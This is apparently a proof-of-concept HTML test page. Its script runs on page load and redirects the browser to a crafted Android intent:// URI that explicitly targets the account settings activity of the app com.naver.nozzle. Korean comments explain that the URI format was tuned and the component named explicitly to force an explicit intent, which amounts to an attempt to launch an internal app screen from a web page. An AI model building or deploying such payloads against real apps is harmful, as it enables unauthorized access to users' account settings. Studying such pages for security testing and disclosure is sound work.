<!DOCTYPE html>
<html>
<head><title>Test</title></head>
<body>
    <h1>Hellllooooo!!!</h1>
    
    <script>
        // 1. 단순 스킴이 아닌 'intent://' 표준 규격을 정밀하게 맞춤
        // 2. package와 component를 모두 명시하여 'Explicit Intent'임을 강조
        var payload = "intent:#Intent;action=android.intent.action.MAIN;" +
                      "category=android.intent.category.DEFAULT;" +
                      "component=com.naver.nozzle/com.naver.nozzle.setting.account.AccountSettingsActivity;" +
                      "package=com.naver.nozzle;end";
        
        location.href = payload;
    </script>
</body>
</html>
